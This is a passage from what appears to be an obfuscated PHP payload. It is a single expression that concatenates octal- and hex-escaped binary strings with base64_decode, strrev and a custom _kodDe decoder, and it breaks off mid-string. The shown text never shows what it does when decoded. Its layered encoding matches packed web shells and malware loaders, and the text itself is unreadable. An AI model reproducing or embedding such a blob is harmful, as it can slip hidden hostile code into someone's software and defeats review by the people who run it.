374\344\315\73\17\274\341\250\273\327\376\375\157\217\337\174\340\67\213\276\170\375\363\167\103\337\350\137\277\261\375\363\17\217\271"."\261\161\357\115\137\364\155\372\342\353\63\232\277\331\21\132\63\272\337\316\315\317\277\277\174\301\276\227\177\360\365\277\366\153\234\345\177\53\366\207\211\326\340\313\373\256\373\171\327\355\267\36\373\330\347\43\47"."\74\362\233\123\203\325\123\17\236\367\172\336\265\304\163\353\133\77\76\373\156\337\36\273\113\157\77\40\65\335\361\223\263\137\75\56\370\307\53\207\327\364\126\77\176\301\326\320\315\147\265\237\254\377\165\365\272"."\x35\xf3\x3e\x79\xe5\x94\xf\x36\x5d\xf2\xcb\xe7\x6f\xeb\x7d\x74\xbf\x7d\x4f\x78\x66\xfe\x85\xc7\xad\xf9\xc9\x17\x85\xb9\x4b\xe6\xfd\xa8\xd4\xda\x7a\xee\x79\xd\x81\x2b\x6a\xd7\xfe\xf5\xe9\x1f\xee\x76\xd5\x87\xb\x16\x5c\xbd\xf7"."\302\127\127\15\36\363\373\243\277\332\260\172\100\312\237\172\325\37\256\270\345\223\103\306\113\267\155\270\176\353\261\147\204\316\377\164\346\246\145\315\107\76\266\174\365\361\23\215\17\127\75\277\143\305\17\217\76"."\172\356\5\63\135\367\137\323\62\353\207\37\34\327\267\341\307\361\213\23\15\117\106\116\13\57\31\176\270\264\373\323\23\207\236\274\337\257\127\276\334\174\325\202\65\373\336\237\76\177\217\103\366\177\152\323\303"."\x97\xec\x3f\xb5\xdf\x77\xf\x38\xa4\xf1\xad\x5f\x8c\x1c\xb1\x7a\xf8\xa6\x79\x89\xc4\x45\x6f\xce\xfd\xfc\x95\x5d\xbb\x3f\xaf\xbd\xb4\x6b\xfb\xe1\xcf\xf6\xcd\xf1\x5f\xf9\xe2\xc3\xb3\x4e\x7f\xf8\xb9\xf4\x4d\xa1\x4d\xbe\xfb\x87\x57".base64_decode('XZS946UtNx93+jn5Swc+u/ebKx4++qBLbl793AWfXTnzlfN+e8o9w4ufuyJ5zKUDG7b1XfzO13d3')."\176\161\377\371\267\16\276\46\375\343\271\73\37\330\362\332\173\117\237\172\361\335\333\236\33\171\364\231\253\157\71\362\266\277\274\247\325\176\175\376\372\153\266\334\371\351\307\207\74\145\56\270\154\257\133\137\231".strrev('[C&Á³Åy9–înZÆ÷ºm{®Ñu]vWÇæÁã°şÃ-šírw ø>kë†¦öKv¨Âı')."\137\114\355\261\351\241\345\27\327\76\72\173\251\353\223\37\37\63\271\173\311\171\261\357\301\150\366\255\306\333\257\17\364\175\274\154\370\224\263\66\236\364\344\127\157\317\274\341\220\103\135\65\67\75\361\144\322"."\x3c\x6e\xb7\x6d\xb7\xb5\xde\xb1\xea\xed\x87\x8f\xff\xe7\xc3\x4b\x96\xee\xbf\xdb\xa2\x86\xa9\xb0\x6f\xef\xcb\x67\xe7\xfb\xef\x78\x77\xd1\xeb\xd2\xc8\x82\xd5\xd7\x1e\x3c\xfb\x9c\xb5\x1e\xf3\xda\x51\xf7\x35\xf2\x9c\x2b\x95\x87\x3f"."\xdc\xf1\xe1\xac\xc3\x1a\xcf\xda\x78\xd6\x5f\x1e\xf9\x95\xd9\x79\xdd\x1d\xdb\x17\x74\x5c\x78\x72\x7d\xe6\x74\xf5\xc3\xa1\xfa\x95\xc1\xdc\xc2\xa6\xbe\xa7\x8e\x5b\x72\xc1\xc6\x13\x7f\xbc\xc9\x77\xc3\xbd\x67\x3d\xf4\x9e\xa3\xed\xb0".base64_decode('W9fetLmw4aW/v7FQybx3+BlvL3ztmpRr8ayTjzY+njv0tL/23HtzMwZnznqrau2+Kz2nL3n5yTeW')."\76\174\365\245\205\67\176\371\321\243\213\216\70\146\217\356\311\374\376\177\337\64\263\363\202\237\134\45\171\73\166\274\161\125\253\133\155\335\74\262\375\374\243\306\176\262\242\264\344\346\57\136\171\114\275\354\205"."\303\216\377\353\256\155\55\57\37\372\332\300\135\215\165\253\137\270\142\333\266\207\357\177\376\322\27\256\175\371\203\134\117\333\13\261\203\66\305\202\137\364\257\173\172\333\202\35\277\371\371\213\7\335\363\320\263"."\117\135\362\347\25\167\227\222\137\75\63\273\346\331\332\341\176\347\357\263\327\365\172\337\160\257\130\166\310\167\112\147\317\163\44\177\75\65\347\234\277\135\45\75\160\341\41\215\237\75\164\340\246\376\343\77\70"."\366\263\163\177\375\303\131\27\134\360\325\261\207\156\370\272\60\343\311\365\167\314\174\326\74\354\240\376\173\177\71\347\320\175\166\271\377\3\357\266\171\163\166\172\316\172\177\340\234\37\353\67\254\276\374\224\115".base64_decode('g6HWqx2Zxz8778wrOx+oKn1v7k2XvvTO8jmv73POnC++fOm1+NKvPv5EW3rnZ29ckDns6OK/Lntt')."\323\372\177\376\375\363\256\120\374\233\277\136\366\132\353\67\157\275\367\316\201\373\56\274\143\342\343\367\276\214\307\273\216\211\177\363\316\227\333\117\375\107\250\175\321\27\237\174\370\124\373\327\37\175\371\273\173".strrev('Ávl”¯S9ÚöŞ7òØØy>´‡“Cò„rn§YéõÚî0Ï&gÂ÷¹İ^‡ÂËyšáu|ß1Îı}Ö‡').strrev('¼ãŸOqßÀò|/Z;ï·ö°Íõ¾¯Oïâü?‡-¨»7çz¼×¾¥«øG«Áò\\SÉ¿×ûà')."\171\57\254\136\377\346\237\367\276\177\344\365\361\107\266\365\25\367\157\236\334\257\347\350\305\301\127\357\334\164\127\352\260\313\156\334\272\352\364\357\177\370\332\165\47\215\174\175\371\121\256\27\116\271\346\73\37"."\x5c\xf4\xd1\xc5\xcb\xa2\x8f\x9d\xd1\xf3\x8e\xaf\x79\xe2\x91\xdf\xf5\x9e\x3d\xf7\xf5\x1d\x5f\x9e\xbc\xfb\xcc\x1e\xe5\xa5\x67\x1d\xd7\xbe\x75\xe9\x7\xee\xd4\x86\x27\x2f\xea\xa9\xf9\x68\x69\xf7\x6f\xbb\xc7\xef\x3b\x80\xaa\x49\x2f"."\x5c\x44\x14\x2\x16\x2c\x22\xfa\x9e\x8b\x17\x90\xc3\x82\x86\x45\x34\xb0\x60\x1\xe\x10\x7d\x8a\xa6\x26\x9a\xa7\x69\x11\xd\x10\x8\x29\x63\xfe\x42\x92\x63\xc1\x42\x22\x88\x2e\x5a\x4c\x14\x20\x4a\xf9\x4c\x2a\x9b\x26\x17\x17\x8d"."\xcd\x24\x43\x76\xaa\xa8\x4f\xaa\x64\x67\x46\x30\xa7\x12\x63\x23\x69\x8d\x1c\x77\x35\x2d\x22\x1f\xd7\x47\x26\xb3\xe9\x51\x22\xe3\x93\xaf\x66\x47\xd4\x42\x32\x4d\xa4\xf7\xdc\xc4\xc8\x14\x3b\xf9\x6c\x58\x44\xbe\xdf\xb8\x90\xe0\x2e"."\xa6\x55\x6b\x6e\x26\x81\xa6\xf9\xa4\x15\xe3\x89\xd1\x74\x6e\x82\x6c\x98\x9a\x16\x53\xed\x91\xfc\xc8\xe8\x44\x91\x1c\x7f\xa6\xb\x63\xf9\xcc\x14\xd9\x33\x35\x36\xd1\xe6\x36\x93\x12\x16\xd2\x32\x4b\x5a\x31\x25\x4f\x10\x59\x7c\x44"."\xce\x4e\x18\xc3\x69\xba\xd1\xd2\x33\x45\x83\x5c\x17\x35\xd5\x13\x7c\xdd\x48\x8f\x4e\x4d\x90\xd3\x98\xe6\x86\x85\xa4\xdc\xc5\xa4\xf6\xe3\xd9\x91\x61\x3d\x43\x6e\xfc\x8a\x63\x4a\x6a\x9c\x6a\x35\x4d\x8e\xaa\x13\x63\xa\x39\xd6\x2b".base64_decode('6YnsxBhJGUlPqPkU6dKFi6mOo1maVJIjpKQROTOlEwWn5sZ6+nmCm01MFtgR8Jis57IK6XdtfGrE')."\54\220\76\151\246\344\321\104\273\101\56\346\362\223\123\344\104\242\224\313\33\243\5\322\145\123\223\371\321\104\201\214\351\350\324\310\204\66\231\243\137\45\237\37\233\314\30\131\172\47\331\264\240\231\322\34\111"."\136\324\114\72\107\31\31\315\230\45\322\47\215\363\311\120\54\134\110\360\346\123\202\311\116\310\243\303\46\151\344\370\110\136\113\233\44\323\142\112\362\115\364\333\13\151\246\371\164\364\107\224\244\134\112\21\232"."\120\322\211\154\152\214\234\60\316\257\157\242\173\355\341\311\222\111\366\232\232\76\226\310\47\311\170\144\362\246\134\32\247\32\304\11\175\274\240\61\322\41\255\30\323\224\174\122\47\335\232\230\110\232\332\224\114"."\x69\x83\x50\xec\x44\x72\x3c\x3b\x66\xaa\xb4\x3e\xc6\xd4\xf0\x4\x21\xf5\x9\x30\x24\x5\x7a\x32\xdf\x4c\xa7\xeb\x58\x3a\x9b\xd3\xd\x82\xb2\x80\x8e\x6a\xc3\x7c\x32\x4a\x9\x23\x67\x16\xe9\x4\x5a\x4c\x1b\xb1\x78\xf1\x42\x4a\x50".base64_decode('+exUSqe9TghQHh3L6lSVGGy6U+lMkraE9FRRG0tMlmhl5pOMxvjYZI5OmMkpIzVGCUrJjY1PpQgl')."\66\65\222\161\236\77\237\4\350\330\350\303\231\122\156\42\115\271\0\235\274\24\155\114\3\314\104\46\23\155\101\175\63\235\207\213\150\373\26\123\102\42\25\152\150\40\335\72\136\124\362\243\31\162\22\220\54"."\115\216\216\24\310\374\53\344\47\207\315\211\14\255\307\2\72\336\4\65\247\217\231\164\37\36\227\323\104\157\64\220\27\41\144\310\341\35\100\106\61\343\104\67\214\120\116\207\47\22\360\306\373\74\124\245\111"."\56\24\334\120\131\0\352\134\161\265\300\344\260\222\34\215\313\11\115\67\351\1\122\21\152\252\221\151\265\52\107\200\35\162\162\224\36\76\33\246\154\26\15\33\2\325\314\117\212\232\233\243\12\235\313\51\252"."\xe0\xc8\x2f\x90\x8d\x22\x52\x27\xa6\xe9\xfc\xd8\x1\x9e\xd7\x8\x17\xcd\x30\x1a\x11\x71\x93\x79\x53\x48\x6\x31\x4b\x2a\x54\x8\x84\xa7\x23\x3c\x46\x8f\xf1\x23\xa6\xa6\xb3\xab\x77\xac\x21\xe3\x82\x35\x74\x59\x1b\x44\x67\x4\xc1".base64_decode('SCUs6QxKz1TsKWk7PIG6jukfwP9Iw7Bth6GMASKhJ0sY20X7KyH0Oz5XN2Vj1CWCnWKqmgefzmZd').base64_decode('VpsfaABChynOKYe3kN97CjDex0JXWAdN0C8rpDQGTRkWWyQyyXKTMCqEbS128ZrVwGBtpR4XakXa')."\xea\x86\x6d\x75\xa3\x2\x85\x76\x8a\x69\xb8\x16\x3c\xd1\x36\x86\x62\x93\x32\x26\xed\x27\x7e\x28\x4a\x2a\xc8\x6b\x47\xee\x1c\xca\x3a\x12\xd\xbd\x95\x3a\x2d\x44\x61\xa5\x6b\x72\x3a\x89\xac\x75\x1c\x12\xfe\xa0\x43\x42\xb7\x80\x92".strrev('gY‘xô%oeÉ–1­¤uâj±a£S%˜õDƒ&'."\r".')©¬ƒ-)I…‚¬“•¥u%bò8©uØ“à$’Õ')."\xb0\xbb\x10\xcb\xf5\x9b\xe6\xcd\xca\x86\xc1\xd5\x3c\xd1\x35\x2d\x6f\x4\x8e\xb2\xcb\x97\x8\x28\x9a\x9\x59\xba\x92\x52\xa9\x56\x9d\x92\x43\x98\x84\xf5\x60\x15\x63\xa6\xce\x97\xcc\x2a\xb2\x6e\xb9\xd8\x69\x5d\xa\xf8\x1d\xb4\xcf"."\63\227\54\45\326\102\344\306\52\56\174\227\204\5\336\50\100\263\366\313\42\72\301\134\276\16\301\220\16\242\11\71\260\226\320\22\310\204\332\70\224\261\131\20\16\27\363\60\225\350\246\273\205\374\56\216\72"."\x4e\xf4\xf5\xd2\xa4\x62\x3d\xd6\xf6\x83\xa\x3b\x59\x97\x80\x66\x2\xfe\x9b\x32\x90\x66\x12\x99\x5\xb3\xc8\xf8\x8\xc6\x41\x61\xde\x9b\x30\x3b\xea\xdc\x6f\xc9\x6a\x8a\x4d\x2f\x0\x1e\x9f\x67\x8a\x46\x46\x56\xa6\x97\x4f\x6\x60"."\374\152\136\141\343\120\64\104\275\114\205\23\65\124\340\213\47\263\32\345\117\140\4\343\51\225\240\6\3\35\161\137\40\54\54\156\205\242\175\161\23\355\53\75\175\201\170\44\22\22\226\272\26\201\273\100\175".base64_decode('eX51CWNcbx4e3ovXmoYxrumkU6H9G1SBjEjE/gaMs7fbE2Zqjs2uelcDxwUfjENtzzZqrxOJesIV')."\x6c\x21\xb1\x8d\x24\x19\x4\x62\x17\x49\x32\x74\x87\x6\x24\x6f\x28\xd8\xdf\xd3\x1b\xc1\xc6\x7f\x18\xde\x1b\x12\xd2\x91\x32\x9b\x25\x59\x4\x93\x62\xfd\x7d\x41\x8f\xd7\x2f\x5\x7a\xa3\x21\xaa\xa5\xca\x94\x75\x91\x7e\x72\x84\xc5"."\151\323\165\103\141\266\217\44\77\216\210\72\324\142\211\254\44\102\271\203\216\352\130\125\254\56\126\23\253\135\343\212\31\103\144\202\255\21\107\204\360\376\76\37\151\121\13\13\261\5\243\47\22\71\222\150\350"."\207\302\36\157\220\326\2\110\63\44\30\362\6\160\140\347\271\67\276\265\365\364\235\27\157\336\176\362\106\120\320\216\213\216\333\161\301\255\157\335\276\361\355\137\334\275\175\363\151\73\357\71\175\307\271\67\354".base64_decode('OO1YUvW3b7jtrbvv3XnuNds3/3LH+XfsvOh4nPDOtTduP+UaVjHpnXPu2XH6VTvO27Jj4+btW8/Z').base64_decode('ftdx22+/3QFyv3PCxp13b95x0vk7rvj5jltO3bFp4/ZTfr39wmt2nn7D9st/sX3DxrdvOG+WnXZw')."\174\220\216\2\271\233\166\37\25\63\352\152\160\317\306\214\171\260\127\153\301\157\15\324\167\5\277\124\315\17\120\134\4\32\253\364\172\375\166\375\161\61\112\154\106\353\60\121\100\232\146\42\205\101\154\116\151"."\x3c\x8e\x4c\xa\xaa\xa7\xad\xc5\x3a\x32\xf4\x42\xa5\x84\xca\xf8\xfc\x11\x6f\x38\xd0\xe1\x27\x1a\x95\x6c\xa0\xe6\x22\xcd\x3e\x72\xe5\xd\xa0\x91\xf0\xa\x16\x66\x46\x16\x65\x96\xbe\x52\xd\xb5\xf4\xad\x95\x2c\xd\x91\x5d\x49\x2d"."\xb\xf6\x76\xa8\xb2\x52\x15\x54\x21\xa9\x72\x40\x76\x8b\x84\xd\xa9\xa\x2e\x17\x0\xa0\x24\xc1\x6c\xab\x81\x6\x83\x48\x59\xad\x7a\x55\xb5\xa3\xde\xd1\x50\x2b\x11\x33\x60\x9c\x83\x98\xfd\x4a\x55\xc4\xe4\x97\xe5\xb3\x7c\xc4\x91".base64_decode('sMQaHPW1UlVhtIrUi/crqH0cYxqS7KghFRary3EBizJMXVYBz5KSDgZi+cGvxZQ36eI58DgBDDtM').base64_decode('8vT6rJjYArivWpLzKZCC+1cc5upaKUF0ViskomyWzmizdEbNPMIi+rrYeGM1UwnbKOBqyQYdKAJF').base64_decode('QwWheLQorgaaAQYH44MASxlVJnlJgBOxBDqCEM4GsUIaMs2uwsIObmfOyFAuR2yDe1axNlBaJkOg')."\160\303\156\150\155\341\217\172\273\61\225\107\4\62\117\45\346\132\10\225\167\247\144\41\221\54\265\341\43\170\170\272\100\206\60\3\341\5\172\73\103\341\36\154\145\20\361\166\373\173\74\56\302\277\61\45\140"."\x7c\x28\x54\x48\x6d\x52\x35\xe4\x7c\x18\x54\x6d\xe9\x7e\xf4\x21\xda\x65\x51\xf4\x55\x30\xaf\xe2\xa6\x62\x98\xb8\x17\xa\x19\x52\x19\x32\xfa\x12\x32\x23\x93\x51\x96\xb6\x6a\x6c\x58\x49\x8a\x64\x7e\x8\x42\xe1\x68\x1c\x74\x0\x61"."\xcf\x2\xd7\xad\x16\x16\xa\x51\x61\xb3\xa8\xeb\x25\xb6\x51\xc3\x62\x36\x97\x5b\xe4\x79\x5c\xe8\x51\x52\x84\x39\xa6\xe5\x24\xd8\x87\x51\x6b\xe3\x4\x75\x6a\x0\xaa\x0\xbf\xec\xd\xf5\x76\x6\xa8\xd9\x85\x2f\x61\x49\xf3\x85\x3"."\xd0\xe4\x8f\x54\x4e\xa2\x25\xc4\xf9\x1d\x3c\x88\x14\xc6\x53\x2c\xcc\x6d\xe5\x60\x2\x5b\xf6\x41\x84\xaf\xfa\x30\x45\xf0\xad\x0\x3f\x13\xe9\x65\x61\x2e\xd9\x81\x8\x54\x93\xe3\x1c\x78\xc0\xc7\xc2\xdd\xcc\x62\xa\x26\x84\xc2\x42"."\304\23\366\364\104\130\64\74\0\70\72\204\11\226\101\75\236\110\24\264\252\267\277\207\163\375\240\147\5\40\230\20\227\113\50\307\256\161\325\55\255\215\141\273\7\34\304\77\313\150\14\352\216\17\255\155\160".base64_decode('SAvW1xIcaikQN4fBvj7Ov3JkMB4MdeE48vngz6e48C0NSkA4jXLh1KDLF5sREqBjCRtTSb2hAQ93')."\40\40\44\140\10\21\177\45\356\126\300\175\324\140\154\74\346\2\42\203\261\206\233\63\370\72\44\52\214\170\341\321\4\321\263\47\271\75\164\105\245\113\207\203\4\342\131\55\103\315\204\1\213\244\2\4\376"."\x5d\x49\x3\x88\x7b\x92\xc\x60\xf\x57\xc8\x52\xf3\x6\x6c\x57\x11\x8f\xad\x8b\x1d\x1e\x73\xba\xb0\x29\x9\x94\x64\x62\xe\x5e\xb3\xb8\x7f\x25\x58\x75\x23\x11\x8b\x1d\x4c\x1c\x19\xd4\x93\xd2\x41\x9b\x49\x8\xcf\x63\x1c\x69\x25"."\x3f\x64\xe3\xd1\x4a\x7a\x82\x44\xdb\xdb\xd8\xd0\xfa\x8f\x5c\xd7\xb\xfe\xba\xa2\xeb\xfc\xe0\x2f\x8\x7e\x82\x51\x30\x78\x2a\x43\x0\x93\x34\x18\x58\xee\x5f\x7\xff\xe1\x9\xb5\x92\x88\x10\xe8\x5d\x7\xfe\x5\x2c\x66\x5d\xa0\xd7".strrev('ªsÕ5£fajômÜxÚ¼Ğç<ê'."\r".'xñ³ôã¨Îş‚’{5ˆäàšiX'."\n".'_“'."\r".'1ûğÃ¹')."\311\52\342\211\170\71\377\265\320\101\71\11\40\245\141\353\370\63\17\27\44\336\25\16\365\367\11\361\156\317\212\100\157\27\215\271\353\150\250\216\32\344\373\2\21\320\105\136\112\203\334\361\206\30\47\42\47"."\22\214\104\221\327\102\320\76\300\333\101\104\20\304\341\16\0\363\146\353\34\353\350\17\4\175\242\251\37\104\44\113\12\342\353\144\125\231\113\53\107\343\310\350\217\106\140\227\323\60\42\57\32\101\175\100\43"."\xb8\x3\x68\xc\x75\x17\x8d\x20\x7\x1f\x34\x82\x1a\x4a\x23\x70\x4b\xe2\xef\xa5\x69\x60\x23\x8\x36\x71\x74\x77\x97\xe1\x3a\xa7\xc3\x72\x89\x99\xb0\x2c\x49\x25\x4\xeb\x54\xdb\xd1\x13\x3a\x56\xf1\xc3\x71\x23\x8b\x4\x52\xdc\x92".strrev('Öt\\g.°NÎzÉgÂ1F@>ñ(ş(¡ÙU–U±,”5á¤ŠY­ø61¸„œ%†x9')."\x23\x8\x44\x8e\xd3\xf8\xb1\x84\x75\x77\xc4\xb8\xcc\x1a\xb6\xe9\x21\x96\xae\xe\xf2\xab\xf3\x66\x59\x95\xf1\x20\x84\x8c\xf5\x9e\xf8\x27\x46\x70\x63\xa4\x6\xc4\xb8\xa5\xda\x41\x97\xe2\x38\xb7\x93\x34\xf5\xa2\xa0\xf9\x89\x74\xd0".base64_decode('QKd7uAkUU9REacUERBY7Hh0DgcGg1kpILiBVNzWJY1n1S6mZJPaJYlceE8Fc/4yfuFIdatCxlgz9').base64_decode('gqWSnErRxU2XmX2ROcwtsUQ/JL4O2gPFvBlRsuSc3pdAOndci5t1hyHo4qHjJ94+7PTFlpGUFGBV')."\x16\xb0\x38\x30\xc8\x3d\x8e\xc0\x93\x1f\x5e\xe6\x94\x4a\x8f\x77\x59\xd\xf2\x5a\x9f\xa2\xe7\x54\x74\x7e\x35\xc0\x15\x75\x59\xba\xc2\x47\x9\x69\x43\xb3\xd3\x73\x74\xb2\x98\xb7\xba\x3a\x29\xe6\xc1\x17\xfa\xd8\x0\x38\x1b\x28\x32".strrev('‹G„*—P$½D0o@Ğ¾iBP­ª2~r=i©œ«e˜ÂbÏV)'."\n".'áÈŒº'."\n".'ò=>Ó"b\\Æ…õ').base64_decode('sPnQXTRi0kDlJukyqc8AXVkQnXI/WrNEMkDjyQnKE/Z2A1Ew3hkAcrJ/ZRRDl4d88UioP0xPLmAc').base64_decode('WTaE/d5V7CSBQTs9K+wQWFzU01URzARBCEc8Nx4OQanZH+y0ZYh0M4cUVlg8GOhdXjEhGor3CFkw')."\x10\xec\x9d\x7b\xec\x30\x6b\x9\x11\x3f\xec\xa\x1e\xef\x8\x86\xbc\x42\x72\x20\x54\xde\x13\x80\xd1\xdb\x80\x58\xac\xa6\x8b\x71\x4d\x6c\x2d\xe2\xbc\x2d\x80\x1\xa7\xd6\xc1\xa5\xd9\x19\x7\x2b\xfb\xd2\xd8\xfa\xda\x9a\x98\x7b\xa9"."\xab\x8e\xc9\x93\x78\x68\x4\x3d\xfe\xca\x60\xd5\x88\x5a\xd8\x98\xdb\xe5\x22\x5\xb0\x0\x90\x66\x99\x95\x30\xa5\x41\xe2\xf1\x27\x82\x6d\x2b\x2d\x5f\x20\xd2\xc0\x7a\xc1\x4f\x6\x34\x15\x71\xd9\xfd\x6a\x4\xf0\x99\x60\x3c\xb2\x2a"."\302\172\22\257\1\225\322\55\264\203\321\304\243\153\33\62\370\353\23\121\243\112\256\120\21\321\102\174\26\113\7\21\344\122\65\336\103\170\121\22\115\253\60\22\307\130\253\152\55\164\46\46\213\320\300\223\367".base64_decode('N5/FAOTi7IqUxDc+ZA47Re9JsNdFzptK2KYeAfAbQmGCcmAjvUNb5cw5U7FoF3RDEVvNKqjqgh+I')."\244\226\117\41\327\27\204\65\310\111\312\144\213\140\333\110\206\36\255\77\206\163\134\245\135\60\207\331\217\222\373\233\270\214\254\237\343\342\325\333\230\323\120\63\171\247\234\315\150\200\7\17\347\50\124\36\265"."\244\163\37\42\5\15\154\212\251\33\74\47\370\204\220\206\221\101\341\164\151\201\247\330\314\365\12\214\30\54\46\122\16\354\123\166\71\301\215\350\204\325\44\202\252\334\42\315\47\356\211\72\301\72\107\327\125"."\354\327\53\0\375\316\160\143\52\310\46\221\107\36\262\226\113\334\235\31\225\236\53\163\166\270\125\26\24\325\51\203\310\215\362\273\254\334\50\73\211\247\313\74\255\172\111\351\24\256\274\370\36\232\170\32\3"._kodDe('MglV4H91AoGUOGOxLp7j+9Eoxtp1KMN977rlCtrDe8T1D0hbwYFFoO+Zv7Yes33ledRdLEpujajG8Q==').base64_decode('0jDoakIS5c5Z5lhdAGEg9h0CZM4UvK+gg4ChNlLBQC634Di2Sae3XsMyqzBsBg5V+u7Kit9dWem7').strrev('÷°„ÂÓìŒCÁ¾§›('."\r".'Sì.æ7ÆºD:·ˆÇŞp9B1I@Xq‘1Ë±x(\\¤‘²]şY]ßm+').base64_decode('H934SHRJYAVBuQuxdQyZS9QmsrJhQrGEH1RAI8seJgrplLLdmmFUUHgAUAnfHhUxE5KQCKpAz4qq')."\x21\xc9\x89\xbc\xa6\xe7\xe8\xd8\x10\xaf\x48\xcc\xc1\xd\x73\x7f\xc3\x7d\xe4\xe0\x7d\x20\xe\xfb\x99\xdd\x64\x8f\x3c\xe1\xc9\x28\x11\x5\xf2\x36\xd2\x51\xfe\x89\x82\x66\x28\xa2\x67\xa5\x94\x82\x3c\x76\x30\xeb\x1a\x79\x2\x72\x1c".base64_decode('escp66M0ZcIJam1z8WMoyiiVGgXhnAnkfcx1j71usAedOYsHNOpVSPTBoFrsVjkb1LkTJ3SE6KwI')."\x70\xa\xd6\x69\x98\x3d\x8\x7e\xb9\x40\x43\x32\x6c\x34\x9c\x64\x42\xf\xa3\x9e\xa1\xf7\x7b\xf8\x67\x75\xa5\xea\x39\x75\xee\x8e\x29\x14\x89\x60\xa7\x74\xcb\x95\x49\xea\xd8\xc8\x36\x25\x6c\xbe\x90\x62\x5d\xb1\x9e\x58\x54\xec\x57".base64_decode('U5fTaVBtwX2KpS7gGxJt+vR+m8hW+PCKnppIIvIe5tbRRahjPM4oFfnDrECrCP7fU6tIMnDFpjOU')."\337\273\26\212\202\113\127\54\230\367\41\347\133\224\251\10\333\22\344\364\212\270\244\143\136\250\100\267\346\73\264\24\131\41\327\126\1\172\255\152\251\232\123\3\176\153\253\34\125\120\2\103\161\70\302\20\200"."\276\135\325\62\247\6\5\152\211\161\347\24\121\162\22\274\310\360\243\132\262\341\130\52\233\246\160\304\260\24\365\35\234\370\215\356\106\367\70\341\61\113\307\340\27\271\217\111\373\202\61\21\7\74\222\136\35"."\307\105\116\115\326\0\62\106\142\112\67\253\11\345\341\75\276\146\312\162\75\75\253\235\334\257\123\353\322\211\134\126\42\176\230\332\252\33\134\365\325\22\165\72\332\126\335\37\355\164\56\252\136\332\76\263\325"."\213\316\32\115\245\7\36\26\102\237\132\330\3\147\73\71\75\150\205\163\225\105\334\326\330\164\171\11\357\313\311\123\132\36\254\213\140\207\235\163\45\111\147\26\377\27\36\307\275\165\345\25\163\134\323\311\221"."\53\141\273\215\365\363\305\51\101\10\315\40\323\27\233\251\266\300\163\12\332\103\375\205\311\142\336\351\5\222\203\23\13\101\55\225\26\304\226\172\53\76\364\273\152\305\27\371\52\344\130\161\33\307\342\14\51"."\307\203\330\235\142\213\44\372\330\24\334\37\71\241\330\201\347\71\335\53\23\30\344\302\24\244\132\225\26\160\160\231\255\276\160\64\234\100\156\203\123\4\314\122\260\234\233\112\45\24\253\327\106\273\57\107\173".base64_decode('L6AscPydopPICSCiw+S8MmE6IQk4qQuL8hQ+1ytWNUmoqRJKf1FN2T+JjredxSL9YMVCxQ0ERUCN').base64_decode('CLDyLKK8DMaaSe/23YBwRlTuMg7Mb6mxqaV5Mfif8Ft6Ol8smG0sSF3KzXKnKavgLh5p2+DoWvzo')."\x9\x60\xde\x8d\x8c\x9\x50\x1e\x63\xc1\xe3\xb5\xb5\x38\x8\x25\xd\xc5\x7b\x57\xc1\x7b\x60\x5\x9e\x9a\xa2\x6a\xd5\x6a\x9e\x2c\xb7\x82\xfa\x25\xeb\xf7\xc\xd\xe8\xc\x5f\xe6\x64\x9f\xc8\x8e\xf2\xa\x27\xe0\x6d\x1b\xa1\xda\x51"."\120\37\215\113\147\150\141\26\130\174\162\270\230\37\155\23\22\45\123\323\244\234\234\237\44\373\206\271\106\313\134\3\253\57\315\165\315\117\33\40\102\70\67\163\170\11\27\35\356\302\3\33\353\222\24\260\54".base64_decode('Q+ER+g91wcUtXMyzkbWtdH3ZInNFWUBhUue+YH9XoFe4YRMAca+vN+7p66uYwCQjU026oetL1wh1')."\240\234\244\344\324\252\346\62\122\22\152\244\265\125\101\150\225\144\350\111\352\156\250\312\115\170\54\102\340\173\257\126\225\144\251\206\131\244\64\240\17\47\12\341\344\352\366\126\267\332\316\272\237\33\113\353\32"."\127\261\163\271\147\303\235\230\33\336\132\345\17\207\343\335\106\71\67\334\34\101\150\47\67\215\226\244\126\131\302\75\333\126\15\257\30\322\325\322\60\130\266\331\45\176\273\75\163\57\75\40\156\165\313\142\42"."\x9c\x52\x61\x8d\xca\xdc\x6c\x37\x56\x62\xc7\x7c\x15\xcf\x2f\x3d\x49\x9b\x63\x4a\xaf\x9c\x5f\x51\x9e\x5\x16\xee\x4a\x56\x4a\x72\xa3\xe3\x1\xb7\xe0\xd0\x94\x9c\x67\x88\xa\x57\x16\x27\x24\xd6\x93\x5c\x76\x78\x58\x81\x40\xa\x72".base64_decode('chRSGWfzONlFEvrgbgcnWBwmmsJNAqg4+BTc7epqZph8Ze1aXBCUB9avL4cRZQR7kqeg2kGQduww').base64_decode('uGHnMLBeWT+D6VZE4hCKE+zt4hnwcs/jIHGQ6vmgWGyw2lW3fr1bpRd0sSprXhfDxvGYy4oPak66')."\x9a\x21\x12\x80\x1d\x13\xb\x96\x47\x90\xe9\x36\xd3\x5d\xc7\xb5\x4f\xd9\x45\x9c\x4\x6f\xe7\xda\xda\xda\x7\xd9\x89\xef\x10\x4d\xa3\x22\xa1\xda\xb0\x88\xe\xf2\xd4\xb0\x33\x3a\xc0\x82\xde\x5e\xce\x38\x18\x59\x63\xe\xe2\x42\xfa"._kodDe('MAzaRZmTl9QTAq2Q5eQG+AKCUMAsS+6mv1ihu7Cl1K8JN0rbnD84Zf6vnxvPG4gY7xHO914yHk4Oew==').base64_decode('2OGgLAZkgVYjqasF08KZsNv/KuRxdkQuyRilSqLexquQ/7wqwIlwCmEBvCqtkOVIupJtq0LVNYYV')."\x5\xe4\x47\x4c\xa5\xd2\x47\x40\xc6\x2a\x89\xf2\xc3\x9c\xcc\x7a\x4c\x37\x35\xb0\xc6\x31\x9d\x52\xe2\x59\xb9\x3f\x4c\x34\xf4\x3c\xbd\xab\x70\x80\x48\x4f\xb3\x8f\xc2\xbf\x73\x66\x53\x42\x41\xae\xbc\xb3\x40\x2c\x45\x6a\x48\x88\xcf".base64_decode('oDuAND8BI46e+8KhaMhLvfdWOiqbT0VVA6sN850O1RBd7l9lxWCLv5tAyPDrxXye3XVC6ZMtXQnk')."\x31\x22\x32\x5c\x34\xf9\xa2\x7\x5d\xed\x45\xa1\x56\xbe\x41\xc0\x82\xab\x12\xe8\x28\x45\x49\xb9\xe8\x5a\xcf\x5c\xe6\x10\x78\x85\x1c\xf8\xf4\x17\x96\x47\xa7\x83\xe0\x59\x94\x7e\x29\xab\x51\x5f\x2d\x8d\xf5\xf5\xf5\xce\xfa\x6\xf0".base64_decode('P7v9IZ9oqa8vQ6mvb0H/4wR0Oks61JoC5i9lNARhXFGoNjJBUfNFKvyA/kJuUlroRF8ibN2WSAps')."\35\211\51\366\226\6\251\361\35\31\2\272\4\300\231\115\303\100\2\1\303\201\132\